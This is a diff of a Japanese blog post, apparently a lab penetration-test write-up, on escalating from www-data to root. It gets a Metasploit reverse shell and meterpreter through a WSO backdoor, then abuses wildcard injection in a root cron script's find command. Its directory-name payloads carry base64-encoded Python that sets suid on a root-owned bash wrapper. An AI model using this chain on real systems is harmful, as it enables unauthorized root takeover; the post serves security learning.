@@ -11,19 +11,16 @@
   <meta property="og:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
   <meta name="twitter:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
   <meta name="description" content="しゅーとです。
-
 引き続きペネトレーションテストの検証をしていきます。
 前回の記事はこちら。
 
 ペネトレ検証-ECサイトに侵入">
   <meta property="og:description" content="しゅーとです。
-
 引き続きペネトレーションテストの検証をしていきます。
 前回の記事はこちら。
 
 ペネトレ検証-ECサイトに侵入">
   <meta name="twitter:description" content="しゅーとです。
-
 引き続きペネトレーションテストの検証をしていきます。
 前回の記事はこちら。
 
@@ -76,9 +73,9 @@
     "name" : "しゅーと"
   },
   "headline": "ペネトレ検証-権限昇格とWildcard Injectionの原理",
-  "description" : "しゅーとです。\n引き続きペネトレーションテストの検証をしていきます。\n前回の記事はこちら。\n ペネトレ検証-ECサイトに侵入\n",
+  "description" : "しゅーとです。\n引き続きペネトレーションテストの検証をしていきます。\n前回の記事はこちら。\nペネトレ検証-ECサイトに侵入\n",
   "inLanguage" : "en",
-  "wordCount":  1434 ,
+  "wordCount":  1410 ,
   "datePublished" : "2019-05-13T03:15:21",
   "dateModified" : "2019-05-13T03:15:21",
   "image" : "https:\/\/www.shutingrz.com\/",
@@ -99,7 +96,6 @@
 
 <meta property="og:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
 <meta property="og:description" content="しゅーとです。
-
 引き続きペネトレーションテストの検証をしていきます。
 前回の記事はこちら。
 
@@ -109,7 +105,6 @@
 <meta property="og:site_name" content="Shooting!!!" />
   <meta name="twitter:title" content="ペネトレ検証-権限昇格とWildcard Injectionの原理" />
   <meta name="twitter:description" content="しゅーとです。
-
 引き続きペネトレーションテストの検証をしていきます。
 前回の記事はこちら。
 
@@ -125,7 +120,7 @@
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="Shooting!!!" />
 
-  <meta name="generator" content="Hugo 0.55.6" />
+  <meta name="generator" content="Hugo 0.63.2" />
   <link rel="alternate" href="https://www.shutingrz.com/index.xml" type="application/rss+xml" title="Shooting!!!"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://www.shutingrz.com/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
@@ -307,42 +302,26 @@ if (!doNotTrack) {
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <article role="main" class="blog-post">
         <p>しゅーとです。</p>
-
-<p>引き続きペネトレーションテストの検証をしていきます。<br />
-前回の記事はこちら。<br />
-<br/>
+<p>引き続きペネトレーションテストの検証をしていきます。<br>
+前回の記事はこちら。<br>
+<!-- raw HTML omitted -->
 <a href="/post/ad_hack-ec_exploit/">ペネトレ検証-ECサイトに侵入</a></p>
-
-<hr />
-
+<hr>
 <p>前回はECShopの脆弱性を用いてRCE、そしてwww-data権限でのバックドア作成に成功しました。</p>
-
 <p>今回はLinuxでの権限昇格です。</p>
-
 <h3 id="権限昇格したい">権限昇格したい！</h3>
-
 <p>現状コントロールできているのはwww-dataユーザの権限であり、rootではありません。</p>
-
-<p>ここから横展開するにあたり、root権限はぜひとも取っておきたいものです。<br />
+<p>ここから横展開するにあたり、root権限はぜひとも取っておきたいものです。<br>
 そこで今回は権限昇格できるかを調査・試行します。</p>
-
 <p>またfindコマンドに対するWildcard Injection を用いた侵害の説明をふんだんにしています。</p>
-
 <p>そして今回も攻撃後にブルーチーム目線で攻撃の痕跡がどう残っているかも確認します。</p>
-
-<hr />
-
+<hr>
 <h1 id="metapreterでラクラクやりたい">metapreterでラクラクやりたい</h1>
-
 <p>現状の手札は、永続化のために設置したWSOのバックドア（www-dataユーザ）のみ。</p>
-
 <p>特権昇格など色々な試行をするためにmeterpreterは便利なので使うことにします。</p>
-
-<p>ECShopが稼働しているサーバにncコマンドは入っていませんでしたが、WSOはリバースシェル接続の機能があります。<br />
+<p>ECShopが稼働しているサーバにncコマンドは入っていませんでしたが、WSOはリバースシェル接続の機能があります。<br>
 そのためWSOのリバースシェル経由で meterpreter に接続します。</p>
-
 <p>まずはAttackerのmsfで普通の shell/reverse_tcp を待ち受けます。</p>
-
 <pre><code>msf5 exploit(multi/handler) &gt; show options
 (snip)
 Payload options (linux/x64/shell/reverse_tcp):
@@ -358,9 +337,7 @@ msf5 exploit(multi/handler) &gt; run
 [*] Started reverse TCP handler on 192.168.2.22:12345 
 
 </code></pre>
-
 <p>WSO の Network toolsで、リバースシェルを張りにいきます。</p>
-
 
 <link rel="stylesheet" href="/css/hugo-easy-gallery.css" />
 <div class="box" >
@@ -372,17 +349,12 @@ msf5 exploit(multi/handler) &gt; run
   </figure>
 </div>
 
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <pre><code>[*] Sending stage (38 bytes) to 192.168.2.24
 [*] Command shell session 1 opened (192.168.2.22:12345 -&gt; 192.168.2.24:47686) at 2019-05-12 03:35:59 +0900
 </code></pre>
-
 <p>きました。</p>
-
 <p>次はmeterpreterにスイッチします。スイッチには shell_to_meterpreter を使います。</p>
-
 <pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; show options
 
 Module options (post/multi/manage/shell_to_meterpreter):
@@ -394,11 +366,8 @@ Module options (post/multi/manage/shell_to_meterpreter):
    LPORT    4433             yes       Port for payload to connect to.
    SESSION  1                yes       The session to run this module on.
 </code></pre>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <p>実行します。</p>
-
 
 
 <div class="box" >
@@ -410,11 +379,8 @@ Module options (post/multi/manage/shell_to_meterpreter):
   </figure>
 </div>
 
-
 <p>無事 meterpreter へスイッチできました。</p>
-
 <p>セッションを見てみます。</p>
-
 
 
 <div class="box" >
@@ -426,18 +392,11 @@ Module options (post/multi/manage/shell_to_meterpreter):
   </figure>
 </div>
 
-
-<p><br/>
-id: 2 は WSO からリバースシェル接続したセッションです。<br />
-id: 3 は id:2のセッションを使って注入・接続したmeterpreterセッションです。</p>
-
-<p><br/></p>
-
-<h4 id="小ネタ-どのようにmeterpreterにスイッチされる">(小ネタ)どのようにmeterpreterにスイッチされる？</h4>
-
-<p>msfconsoleではshellからmeterpreterを起動させましたが、実際metasploitはどのようにやっているのでしょう。<br />
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h4 id="小ネタどのようにmeterpreterにスイッチされる">(小ネタ)どのようにmeterpreterにスイッチされる？</h4>
+<p>msfconsoleではshellからmeterpreterを起動させましたが、実際metasploitはどのようにやっているのでしょう。<br>
 実際にパケットをとってみると以下のようになっていました。</p>
-
 
 
 <div class="box" >
@@ -449,33 +408,22 @@ id: 3 は id:2のセッションを使って注入・接続したmeterpreterセ�
   </figure>
 </div>
 
-
-<p>ワンライナーでmeterpreterのstagerをvictimに実行させてるんですね。<br />
-stagerはLHOSTに記載のホストに接続し、meterpreter stageを読み込み、実行します。<br />
+<p>ワンライナーでmeterpreterのstagerをvictimに実行させてるんですね。<br>
+stagerはLHOSTに記載のホストに接続し、meterpreter stageを読み込み、実行します。<br>
 なお、ワンライナーの内容の通り、/tmpにランダム文字列で一時的にファイルを保存しますが、stagerが起動したらファイルは削除されます。</p>
-
-<hr />
-
+<hr>
 <h1 id="権限昇格の可能性の調査">権限昇格の可能性の調査</h1>
-
 <p>meterpreterも手に入ったところで、権限昇格できるか色々調査していきます。</p>
-
 <p>Linuxに対する権限昇格については以下の記事が参考になりました。</p>
-
 <blockquote>
 <p><a href="https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/">https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/</a></p>
 </blockquote>
-
 <p>後述するLinEnum、BeRootの詳細も書かれていて良記事です。</p>
-
 <h3 id="各種情報の取得">各種情報の取得</h3>
-
-<p>LinEnumを使います。<br />
-LinEnumは、システムの設定不備によって権限昇格が行える箇所がないかチェックするスクリプトです。<br />
+<p>LinEnumを使います。<br>
+LinEnumは、システムの設定不備によって権限昇格が行える箇所がないかチェックするスクリプトです。<br>
 その他、嬉しい情報も集めてくれます。</p>
-
 <p>meterpreterでvictimにアップロードし実行。</p>
-
 <pre><code>meterpreter &gt; upload LinEnum.sh /tmp/.session
 [*] uploading  : LinEnum.sh -&gt; /tmp/.session
 [*] uploaded   : LinEnum.sh -&gt; /tmp/.session/LinEnum.sh
@@ -489,11 +437,8 @@ chmod u+x LinEnum.sh
 
 ./LinEnum.sh | tee LinEnum_out.txt
 </code></pre>
-
 <p>結果は非常に長大なため省略します。</p>
-
 <p>結果をみたところ即脆弱性につながる情報はありませんでしたが、以下のいい情報が得られました。</p>
-
 <pre><code class="language-bash">uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)
 uid=1000(ecadmin) gid=1000(ecadmin) groups=1000(ecadmin)
 
@@ -528,24 +473,17 @@ root      1305  0.0  0.0  55184  2824 ?        Ss   18:59   0:00 /usr/sbin/sshd
 
 
 </code></pre>
-
 <p>この結果から、3つのことがわかります。</p>
-
 <ul>
-<li>sshが2222/tcpで動いている<br /></li>
-<li>ecadminというユーザが存在する<br /></li>
-<li>/etc/cron.dailyに「bakProductImage.sh」という恐らく自作のシェルスクリプトがある<br /></li>
+<li>sshが2222/tcpで動いている</li>
+<li>ecadminというユーザが存在する</li>
+<li>/etc/cron.dailyに「bakProductImage.sh」という恐らく自作のシェルスクリプトがある</li>
 </ul>
-
 <p>※/etc/cron.daily/ 配下のスクリプトは、cronによって日次で実行されるものです。</p>
-
 <h3 id="脆弱性の有無調査">脆弱性の有無調査</h3>
-
-<p>BeRootを使います。<br />
+<p>BeRootを使います。<br>
 BeRootはプラットフォームの脆弱性を調査するlinux-exploit-suggesterというスクリプトの機能に加えて、汎用的に発生しがちな脆弱性も調査してくれるスクリプトです。</p>
-
 <p>meterpreterでvictimにアップロードし実行。</p>
-
 <pre><code>
 meterpreter &gt; upload beroot_linux.tar /tmp/.session
 [*] uploading  : beroot_linux.tar -&gt; /tmp/.session  
@@ -561,11 +499,8 @@ cd beroot_linux
 python beroot.py
 
 </code></pre>
-
 <p>実行した結果、プラットフォームに関する脆弱性はありませんでした。</p>
-
 <p>しかし、汎用的な脆弱性を見つけるルーチンで意外なものを見つけました。</p>
-
 
 
 <div class="box" >
@@ -577,15 +512,10 @@ python beroot.py
   </figure>
 </div>
 
-
 <p>サーバ管理者が設置した「bakProductImage.sh」に脆弱性があるかもしれないという示唆です。</p>
-
-<p><br/></p>
-
-<h3 id="bakproductimage-sh-の調査">bakProductImage.sh の調査</h3>
-
+<!-- raw HTML omitted -->
+<h3 id="bakproductimagesh-の調査">bakProductImage.sh の調査</h3>
 <p>さて、LinEnumとBeRootで見つけたbakProductImage.shが何者かを調べます。</p>
-
 <pre><code class="language-bash">#!/bin/bash
 
 
@@ -623,52 +553,36 @@ chown ecadmin $bak_dir/$date.tar
 rm -rf $TMP
 
 </code></pre>
-
-<p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br />
+<p>ECShopのサイトにある商品画像をバックアップするスクリプトのようです。<br>
 パッと見は普通のスクリプトですね。</p>
-
-<p>findコマンドで「/var/www/html/images/」直下のディレクトリを取得し、<br />
-そのディレクトリの直下に&rdquo;goods_img&rdquo;ディレクトリが存在するかを確認します。<br />
+<p>findコマンドで「/var/www/html/images/」直下のディレクトリを取得し、<br>
+そのディレクトリの直下に&quot;goods_img&quot;ディレクトリが存在するかを確認します。<br>
 goods_imgディレクトリが存在したらそのディレクトリはバックアップ対象になるようですね。</p>
-
 <p>保存先は /var/backups/ecshop で、%Y%m%d.tar の形式でアーカイブされるようです。</p>
-
 <pre><code class="language-shell">ls -la /var/backups/ecshop/|tail -n 3
 -rw-r--r-- 1 ecadmin root 4700160 May  9 01:00 20190509.tar
 -rw-r--r-- 1 ecadmin root 4700160 May 10 01:00 20190510.tar
 -rw-r--r-- 1 ecadmin root 4700160 May 11 01:00 20190511.tar
 </code></pre>
-
 <p>日時を見るに、毎日1時にcronが走っているんですね。</p>
-
 <p>また、以下からcronはroot権限で行われていることが推測できます。</p>
-
 <ul>
 <li>スクリプト内の最後でchownで所有者をecadminに変更している</li>
 <li>バックアップ先のファイルの所有グループがrootのまま</li>
 </ul>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h3 id="ここまででわかっていること">ここまででわかっていること</h3>
-
 <p>今までの情報が多かったので、一旦まとめます。</p>
-
 <ul>
 <li>LinEnumの結果から、設定不備による特権昇格はできなさそう</li>
 <li>BeRootの結果から、OSにインストールされているサーバソフトウェアに脆弱性はない</li>
 <li>BeRootの結果から、cron.dialy/bakProductImage.sh には find 周りに脆弱性がありそう</li>
 <li>バックアップファイルの所有者・所有グループから、cronはroot権限で実行されてそう</li>
 </ul>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h1 id="wildcard-injectionの原理と検証">Wildcard Injectionの原理と検証</h1>
-
 <p>BeRootは bakProductImage.shのfindコマンドに脆弱性の可能性ありと指摘しました。</p>
-
 <p>bakProductImage.sh のfind周りを見てみます。</p>
-
 <pre><code class="language-bash">image_dirs=` find $ecshop_dir/images -maxdepth 1 -name &quot;*&quot; -type d `
 
 for dir in $image_dirs; do
@@ -680,7 +594,6 @@ done
 </code></pre>
 
 
-
 <div class="box" >
   <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
     <div class="img">
@@ -690,36 +603,26 @@ done
   </figure>
 </div>
 
-
 <p>本スクリプトでは find が2箇所登場しています。</p>
-
 <p>まずは2つ目の find の対象パスに注目します。</p>
-
-<p>「find $dir 」とありますが、$dir とは $image_dirs 配列の要素です。<br />
-そして $image_dirs は 「find $ecshop_dir/images 」の結果です。<br />
-さらに、最初のfind の検索条件は 「&rdquo;*&ldquo;」 と書いてあるとおり、任意のものをマッチさせます。<br />
+<p>「find $dir 」とありますが、$dir とは $image_dirs 配列の要素です。<br>
+そして $image_dirs は 「find $ecshop_dir/images 」の結果です。<br>
+さらに、最初のfind の検索条件は 「&quot;*&quot;」 と書いてあるとおり、任意のものをマッチさせます。<br>
 （-type dなのでディレクトリが検索条件）</p>
-
-<p>任意のディレクトリの名前をそのままfindに渡しているということですね。<br />
+<p>任意のディレクトリの名前をそのままfindに渡しているということですね。<br>
 つまり⚠️危険⚠️な名前のディレクトリを作成すれば、findはその名前で色々やってくれるということです。</p>
-
 <p>この仕様を利用した攻撃を <strong>Wildcard Injection</strong> といいます。</p>
-
-<p>しかも今回、/var/www/html/images は公開ディレクトリでした。<br />
+<p>しかも今回、/var/www/html/images は公開ディレクトリでした。<br>
 このディレクトリはwww-dataユーザに書き込み権限があるので、自由にディレクトリを作成することができます。(ここが一番キモ)</p>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h2 id="find-コマンドの-おさらい">find コマンドの おさらい</h2>
-
-<p>攻撃の前に、find コマンドのおさらいをします。<br />
-<br/>
-find コマンドには、-exec という便利なオプションがあります。<br />
-まずは実験のため、自分の環境で/tmp/images/ ディレクトリを作成します。<br />
-そしてその配下に 201903, 201904, 201905 ディレクトリを作成します。<br />
+<p>攻撃の前に、find コマンドのおさらいをします。<br>
+<!-- raw HTML omitted -->
+find コマンドには、-exec という便利なオプションがあります。<br>
+まずは実験のため、自分の環境で/tmp/images/ ディレクトリを作成します。<br>
+そしてその配下に 201903, 201904, 201905 ディレクトリを作成します。<br>
 （面白いのでぜひみんなも試してくれよな）
-<br/></p>
-
+<!-- raw HTML omitted --></p>
 <pre><code class="language-shell">$ mkdir /tmp/images/
 $ cd /tmp/images
 $ mkdir 201903 201904 201905
@@ -727,11 +630,7 @@ $ ls
 201903  201904  201905
 
 </code></pre>
-
-<p><br/>
-find はご存知の通り、ファイルやディレクトリを検索するコマンドです。<br />
--exec オプションは、検索にマッチしたパスに対して、パスごとにOSコマンドを適用できます。</p>
-
+<!-- raw HTML omitted -->
 <pre><code class="language-shell">shu@kali:/tmp/images$ find *
 201903
 201904
@@ -742,24 +641,18 @@ Path:201903
 Path:201904
 Path:201905
 </code></pre>
-
-<p>※{}はマッチしたものが入る変数です。<br />
-※「\;」は-execの終了を示す記号です。<br />
-  本当は「;」ですが、「;」はシェルでコマンドの区切りを示す特殊文字なのでエスケープしています。</p>
-
-<p>上記ではechoを使いましたが、別にどんなOSコマンドでも問題ないです。<br />
+<p>※{}はマッチしたものが入る変数です。<br>
+※「;」は-execの終了を示す記号です。<br>
+本当は「;」ですが、「;」はシェルでコマンドの区切りを示す特殊文字なのでエスケープしています。</p>
+<p>上記ではechoを使いましたが、別にどんなOSコマンドでも問題ないです。<br>
 {}を使う必要もなし。以下みたいに。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ find * -exec uname \;
 Linux
 Linux
 Linux
 </code></pre>
-
 <p>unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。</p>
-
 <p>当然touch コマンドとかもいいです。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ find * -exec touch Test \;
 shu@kali:/tmp/images$ ls -l
 total 12
@@ -768,22 +661,13 @@ drwxr-xr-x 2 shu shu 4096 May 13 07:15 201904
 drwxr-xr-x 2 shu shu 4096 May 13 07:15 201905
 -rw-r--r-- 1 shu shu    0 May 13 07:25 Test
 </code></pre>
-
-<p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br />
+<p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br>
 (状態をスイッチするコマンドとかは冪等性が保たれないのでここで使うのはよくない🙅)</p>
-
 <p>なお、findコマンドを実行したユーザの権限でOSコマンドが実行されます。</p>
-
-<p><br/></p>
-
-<h2 id="wildcard-injection-の原理">WildCard Injection の原理</h2>
-
+<!-- raw HTML omitted -->
 <p>次はこの-execの仕組みを利用して攻撃を試行します。</p>
-
 <h3 id="実験環境の作成">実験環境の作成</h3>
-
 <p>実験用にbakProductImage.shのfind部分を再現したシェルを作成し、vuln.shとして保存します。</p>
-
 <pre><code class="language-bash">#!/bin/bash
 image_dirs=` find /tmp/images -mindepth 1 -maxdepth 1 -name &quot;*&quot; -type d`
 
@@ -793,10 +677,7 @@ for dir in $image_dirs; do
 	echo &quot;===&quot;
 done
 </code></pre>
-
-<p><br/>
-試しに実行してみます。</p>
-
+<!-- raw HTML omitted -->
 <pre><code class="language-shell">shu@kali:/tmp/images$ bash vuln.sh
 find /tmp/images/201904 -maxdepth 1 -name 'goods_img' -type d
 ===
@@ -805,18 +686,12 @@ find /tmp/images/201905 -maxdepth 1 -name 'goods_img' -type d
 find /tmp/images/201903 -maxdepth 1 -name 'goods_img' -type d
 ===
 </code></pre>
-
-<p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br />
-echoだけがあって2つめのfindの結果が表示されないのは、各ディレクトリに&rdquo;goods_img&rdquo;が存在せず検索にマッチしなかったからです。</p>
-
+<p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br>
+echoだけがあって2つめのfindの結果が表示されないのは、各ディレクトリに&quot;goods_img&quot;が存在せず検索にマッチしなかったからです。</p>
 <p>試しに201903のディレクトリにgoods_imgディレクトリを作成します。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ mkdir 201903/goods_img
 </code></pre>
-
-<p><br/>
-再度実行してみます。</p>
-
+<!-- raw HTML omitted -->
 <pre><code class="language-shell">shu@kali:/tmp/images$ bash vuln.sh
 find /tmp/images/201904 -maxdepth 1 -name 'goods_img' -type d
 ===
@@ -826,18 +701,11 @@ find /tmp/images/201903 -maxdepth 1 -name 'goods_img' -type d
 /tmp/images/201903/goods_img
 ===
 </code></pre>
-
 <p>201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。</p>
-
-<p><br/></p>
-
-<h3 id="危険-なディレクトリを作成する">⚠️危険⚠️なディレクトリを作成する</h3>
-
-<p>ディレクトリ名が $dir の形で 2つめのfindに渡されているということは、<br />
+<!-- raw HTML omitted -->
+<p>ディレクトリ名が $dir の形で 2つめのfindに渡されているということは、<br>
 ⚠️危険⚠️な名前のディレクトリを作成すれば任意のコマンドが実行できるということです。</p>
-
 <p>以下のようにディレクトリ名とは思えないディレクトリを作成します。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec touch hack ;&quot;
 shu@kali:/tmp/images$ ls -l
 total 20
@@ -847,13 +715,10 @@ drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
 drwxr-xr-x 2 shu shu 4096 May 13 08:04 '* -exec touch hack ;'
 -rw-r--r-- 1 shu shu  245 May 13 07:45  vuln.sh
 </code></pre>
-
-<p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br />
-先程のfindの結果のとおりパスがマッチしないと-execが実行されないので最初に「*」を、<br />
+<p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br>
+先程のfindの結果のとおりパスがマッチしないと-execが実行されないので最初に「*」を、<br>
 また -exec の終端を示すため末尾に「;」を付与しています。</p>
-
 <p>さて、この状態でもう一度vuln.shを実行します。</p>
-
 
 
 <div class="box" >
@@ -865,18 +730,12 @@ drwxr-xr-x 2 shu shu 4096 May 13 08:04 '* -exec touch hack ;'
   </figure>
 </div>
 
-
 <p>エラーが大量に出ていますね。大量のエラーはインジェクション系攻撃の宿命です。</p>
-
 <p>危険なディレクトリを使ったfindはどうなっているでしょうか。下に抜粋します。</p>
-
 <pre><code class="language-bash">find /tmp/images/* -exec touch hack ; -maxdepth 1 -name 'goods_img' -type d
 </code></pre>
-
 <p>/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。</p>
-
 <p>ディレクトリの状態を見ます。</p>
-
 
 
 <div class="box" >
@@ -888,36 +747,26 @@ drwxr-xr-x 2 shu shu 4096 May 13 08:04 '* -exec touch hack ;'
   </figure>
 </div>
 
-
 <p>hackファイルが作成されていますね。実験環境でWildcard Injectionが成功しました💪</p>
-
 <p>これをcronがroot権限でやってくれると権限昇格が捗りますね。　←ここ一番キモ</p>
-
-<p><br/></p>
-
-<h3 id="exec-の使い勝手を良くする">-exec の使い勝手を良くする</h3>
-
-<p>前項でWildcard Injectionは成功しましたが、これだけでは侵害には使いにくいです。<br />
+<!-- raw HTML omitted -->
+<h3 id="-exec-の使い勝手を良くする">-exec の使い勝手を良くする</h3>
+<p>前項でWildcard Injectionは成功しましたが、これだけでは侵害には使いにくいです。<br>
 これは以下の理由によるものです。</p>
-
 <ul>
 <li>-exec は単一コマンドしか使えない</li>
-<li>ディレクトリ名には「/」が使えないので、ファイル操作が困難<br />
+<li>ディレクトリ名には「/」が使えないので、ファイル操作が困難<br>
 パスが通ってないディレクトリの自作スクリプトを指定することもできません。</li>
-<li>引数にスペースを含められない<br />
+<li>引数にスペースを含められない<br>
 これはforとfindの問題だと思いますが・・・。</li>
 </ul>
-
 <p>ただ、単一コマンドしか使えない場合でも、例えば bashなら bash -c を使ってワンライナーで複数コマンドを書くことができます。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ bash -c &quot;echo aaa; echo bbb&quot;
 aaa
 bbb
 </code></pre>
-
-<p>しかしながら、今回のfor内のfindではスペースが使えません。<br />
+<p>しかしながら、今回のfor内のfindではスペースが使えません。<br>
 実際に試してみます。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec bash -c \&quot;touch aaa\&quot; ;&quot;
 shu@kali:/tmp/images$ bash vuln.sh
 (snip)
@@ -937,43 +786,28 @@ drwxr-xr-x 2 shu shu 4096 May 13 08:34 '* -exec bash -c &quot;touch aaa&quot; ;'
 -rw-r--r-- 1 shu shu  245 May 13 07:45  vuln.sh
 
 </code></pre>
-
 <p>findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。</p>
-
 <h3 id="pythonによるワンライナー">Pythonによるワンライナー</h3>
-
-<p>このままでは単一コマンドしか使えないので、侵害には使いづらいです。<br />
+<p>このままでは単一コマンドしか使えないので、侵害には使いづらいです。<br>
 ただ、今回ECShopが稼働しているサーバにはPythonが入っていました。</p>
-
-<p>Pythonやperlなど、高機能なコマンドが入っていると侵害に非常に役に立ちます。<br />
+<p>Pythonやperlなど、高機能なコマンドが入っていると侵害に非常に役に立ちます。<br>
 スペースやスラッシュなんてbase64エンコードしてしまえばいいのです。</p>
-
 <p>ということで、できあがったものがこちらです。</p>
-
 <pre><code>mkdir &quot;* -exec python -c exec('[base64エンコードしたpythonコード]'.decode('base64')) ;&quot;
 </code></pre>
-
 <p>スペースもスラッシュも使いませんし、これで任意のpythonコードも、OSコマンドも実行できます。</p>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h4 id="試しにディレクトリ作成">試しにディレクトリ作成</h4>
-
 <p>1度にtouchコマンドを2回使ってaaa、bbbディレクトリを作成してみます。</p>
-
 <p>os.systemを使えばOSコマンドが実行できます。</p>
-
 <pre><code>&gt;&gt;&gt; &quot;import os;os.system('touch aaa; touch bbb')&quot;.encode(&quot;base64&quot;)
 'aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==\n'
 </code></pre>
-
 <p>⚠️危険⚠️なディレクトリを作成し、vuln.shを実行します。</p>
-
 <pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ=='.decode('base64')) ;&quot;
 shu@kali:/tmp/images$ bash vuln.sh
 (snip)
 </code></pre>
-
 
 
 <div class="box" >
@@ -985,23 +819,15 @@ shu@kali:/tmp/images$ bash vuln.sh
   </figure>
 </div>
 
-
 <p>ディレクトリが作成されていることがわかります。</p>
-
-<p><br/></p>
-
+<!-- raw HTML omitted -->
 <h1 id="wildcard-injection-を使って権限昇格する">Wildcard Injection を使って権限昇格する</h1>
-
 <p>おまたせしました。ここでやっとVictim環境で権限昇格です。</p>
-
-<p>これまでの内容で、findを使って任意のOSコマンドが実行できることがわかりました。<br />
-そして今回は bakProductImage.sh が root 権限で実行されてそうなこともわかっています。<br />
+<p>これまでの内容で、findを使って任意のOSコマンドが実行できることがわかりました。<br>
+そして今回は bakProductImage.sh が root 権限で実行されてそうなこともわかっています。<br>
 今までの材料を使って権限昇格を試みます。</p>
-
 <h3 id="bashラッパーを作成">bashラッパーを作成</h3>
-
 <p>以下のコードのファイルを作成します。</p>
-
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;sys/types.h&gt;
@@ -1013,9 +839,7 @@ int main()
 	return 0;
 }
 </code></pre>
-
 <p>victimに送信し、コンパイルします。</p>
-
 <pre><code>meterpreter &gt; upload bash_wrapper.c /tmp/.session
 [*] uploading  : bash_wrapper.c -&gt; /tmp/.session
 [*] uploaded   : bash_wrapper.c -&gt; /tmp/.session/bash_wrapper.c
@@ -1028,30 +852,22 @@ gcc -o w ./bash_wrapper.c
 ls -l ./w
 -rwxr-xr-x 1 www-data www-data 6976 May 12 15:43 ./w
 </code></pre>
-
 <p>ラッパーが作成されました。</p>
-
 <h3 id="ラッパーの権限を操作するディレクトリを作成">ラッパーの権限を操作するディレクトリを作成</h3>
-
-<p>次に、ラッパーの所有者をrootにしてsuidを付与する⚠️危険⚠️なディレクトリを作成します。<br />
+<p>次に、ラッパーの所有者をrootにしてsuidを付与する⚠️危険⚠️なディレクトリを作成します。<br>
 作成先は、bakProductImage.sh のfind対象である /var/www/html/images 配下です。</p>
-
-<p>まずはbase64エンコード。<br />
+<p>まずはbase64エンコード。<br>
 「chown root /tmp/.session/w; chmod u+s /tmp/.session/w」というコマンドを実行するPythonコードをbase64エンコードします。</p>
-
 <pre><code>&gt;&gt;&gt; &quot;import os;os.system('chown root /tmp/.session/w; chmod u+s /tmp/.session/w')&quot;.encode(&quot;base64&quot;)
 'aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==\n'
 </code></pre>
-
 <p>ディレクトリを作成します。</p>
-
 <pre><code>meterpreter &gt; shell
 Process 10076 created.
 Channel 17 created.
 
 mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ=='.decode('base64')) ;&quot;
 </code></pre>
-
 
 
 <div class="box" >
@@ -1063,22 +879,14 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
   </figure>
 </div>
 
-
 <p>作成できました。</p>
-
-<p>なおfindに対してWildcard Injectionをするときは、コードが 255 文字を超えないように気をつけてください。<br />
+<p>なおfindに対してWildcard Injectionをするときは、コードが 255 文字を超えないように気をつけてください。<br>
